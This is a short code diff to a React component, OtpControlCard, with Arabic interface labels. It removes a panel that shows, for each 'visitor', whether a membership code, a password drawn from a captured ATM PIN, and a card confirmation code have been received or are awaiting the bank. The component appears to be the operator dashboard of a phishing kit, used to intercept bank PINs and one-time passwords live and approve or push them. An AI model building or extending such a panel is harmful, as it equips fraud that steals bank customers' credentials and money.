@@ -1734,31 +1734,6 @@ function OtpControlCard({
           onApprove={() => onApprove("otpApprovalStatus")}
           onReject={() => onReject("otpApprovalStatus")}
         />
-        {/* Status section */}
-        <div>
-          <div className="text-[11px] text-slate-500 mb-1.5">حالة الموافقات</div>
-          <div className="space-y-1 bg-slate-900/60 rounded-lg p-2">
-            <StatusLine
-              label="رمز العضوية"
-              status={
-                waitingBank ? "waiting" : visitor.otpApprovalStatus || "—"
-              }
-            />
-            <StatusLine
-              label="كلمة المرور"
-              status={visitor.atmPin ? "received" : "—"}
-            />
-            <StatusLine
-              label="رمز التأكيد الكروية"
-              status={
-                waitingPhone
-                  ? "waiting"
-                  : visitor.phoneOtpApprovalStatus || "—"
-              }
-            />
-          </div>
-        </div>
-
         {/* Direct push OTP */}
         <div>
           <input
